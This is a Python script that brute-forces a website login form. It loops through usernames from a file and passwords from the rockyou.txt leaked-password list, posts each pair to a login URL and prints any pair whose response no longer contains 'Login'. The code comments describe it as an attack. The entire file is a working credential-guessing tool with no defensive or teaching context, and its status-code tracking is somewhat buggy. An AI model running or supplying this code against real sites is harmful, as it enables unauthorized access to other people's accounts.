import requests
import urllib.request

# Set the login URL
login_url = 'https://www.example.com/login.html'

prev_status_code = None
prev_response_length = None

# Open the username file in read mode
with open('./file.txt', 'r') as username_file:
  # Read the usernames from the file, one line at a time
  for username in username_file:
    # Remove the newline character from the end of the username
    username = username.strip()

    # Open the password file in read mode
    with open('./rockyou.txt', 'r') as password_file:
      # Read the passwords from the file, one line at a time
      for password in password_file:
        # Remove the newline character from the end of the password
        password = password.strip()

        # Set the login payload with the current username and password
        payload = {'username': username, 'password': password}

        # Send an HTTP POST request to the login URL with the login payload
        response = requests.post(login_url, data=payload)
        
        #return a status code
        status_code = requests.head(response.url)
        response_length = len(response.text)

        if (status_code != prev_status_code) and (response_length != prev_response_length): 
          print(f"Status code: {status_code.status_code}")
          print(f"Length of response: {response_length}")

        # Update the previous values for the status code and length of response
        prev_status_code = status_code
        prev_response_length = response_length


        #print(f"Redirected URL: {status_code.status_code}")
        #print(f"Length of response: {len(response.text)} (Username: {username}, Password: {password})")
        # Check if the login was successful by searching for the absence of the keyword "Login" in the HTML
        if "Login" not in response.text:
          print(f"Success! Username: {username}, Password: {password}")
          break
        else:
          # Print verbose output to show the progress of the attack
          print(f"Incorrect password: {password} (Username: {username})")
      else:
        # If the inner loop completed without breaking, the password was incorrect
        continue
      # If the inner loop was broken, the password was correct
      break
